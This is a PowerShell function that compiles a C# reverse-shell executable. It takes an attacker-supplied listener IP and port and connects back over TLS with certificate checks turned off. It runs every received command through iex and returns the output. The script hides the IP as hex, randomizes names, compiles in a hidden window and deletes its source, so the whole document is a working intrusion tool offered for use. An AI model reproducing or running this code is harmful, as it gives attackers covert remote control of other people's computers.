function New-Reverse {
<# 

.SYNOPSIS

Compiles a .NET (PowerShell) Reverse HTTPS Shell Executable. Currently only SSL listener is supported. $Lhost and $Port are the SSL listener and port.

.EXAMPLE

PS> . .\New-Reverse.ps1

Or:

PS> Import-Module .\New-Reverse.ps1

Then:

PS> New-Reverse -Help

PS> New-Reverse -Lhost 192.168.1.1 -Lport 443

Note: The IP and Port will be hardcoded into the executable as hexadecimal values.

#>

[CmdletBinding()]
param(
	[Parameter()]
	[Switch]$Help,
	
	[Parameter(Mandatory = $False)]
	[string]$Lhost,
	
	[Parameter(Mandatory = $False)]
	[string]$Lport
)

	if ($Help -eq $True) {
		Write @"

 ### HELP ###
 ------------
 Description: Compiles a .NET (PowerShell) Reverse HTTPS Shell Executable. Will save it to $env:temp
 Usage: New-Reverse -Lhost 192.168.1.1 -Lport 443

"@
}
	elseif ($Lhost -and $Lport) {
	
		$Lhost = "$Lhost"
		$ar = $Lhost.Split('.')
		$Octet1 = "{0:X2}" -f [int]$ar[0]
		$Octet2 = "{0:X2}" -f [int]$ar[1]
		$Octet3 = "{0:X2}" -f [int]$ar[2]
		$Octet4 = "{0:X2}" -f [int]$ar[3]
		$Hexip = "0x"+$Octet1 + $Octet2 + $Octet3 + $Octet4
		
		$Z = (-join ((65..90) + (97..122) | Get-Random -Count 5 | foreach {[char]$_}))
		$X = (-join ((65..90) + (97..122) | Get-Random -Count 7 | foreach {[char]$_}))

		$Source = @"
using System.Collections.ObjectModel;
using System.Management.Automation;

namespace $Z
{
    class $Z
    {
        static void Main(string[] args)
        {
            using (PowerShell $X = PowerShell.Create().AddScript(@"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

`$proxy = (New-Object System.Net.WebClient)
`$proxy.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials

`$socket = New-Object System.Net.Sockets.TCPClient('$Hexip','$Lport')

`$stream = `$socket.GetStream()

`$sslStream = New-Object System.Net.Security.SslStream(`$stream,`$false,({`$True} -as [Net.Security.RemoteCertificateValidationCallback]))

`$sslStream.AuthenticateAsClient('$Hexip')

[byte[]]`$bytes = 0..65535 | % {0}
while((`$x = `$sslStream.Read(`$bytes,0,`$bytes.Length)) -ne 0) {

	`$data = (New-Object System.Text.ASCIIEncoding).GetString(`$bytes,0,`$x)
	`$flow = (iex `$data 2>&1 | Out-String) + '(PS Shell) ' + '> '
	`$flow2 = ([text.encoding]::ASCII).GetBytes(`$flow)
	`$sslStream.Write(`$flow2,0,`$flow2.Length)
	`$stream.Flush()}
	`$socket.Close()"))
            {
                Collection<PSObject> Output = $X.Invoke();
            }
        }
    }
}
"@
		$FWDir = $([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())
		$SmaDll = [PSObject].Assembly.Location
		$CsFile = "$env:temp\$Z.cs"
		$Compiler = "$FWDir" + "c?c.??e"
		$CompilerExists = (Test-Path "$Compiler")
		$CompilerArgs = "/r:$SmaDll /t:winexe /out:$env:temp\$Z.exe $CsFile"
		
		New-Item "$env:temp\$Z.cs" -ItemType File >$null 2>&1
		Add-Content $CsFile $Source
		Start-Process -Wi Hidden -FilePath $Compiler -ArgumentList $CompilerArgs
		Sleep 4
		Remove-Item $env:temp\$Z.cs
		Write "`n [+] Reverse Shell --> $env:temp\$Z.exe`n"
	}
}
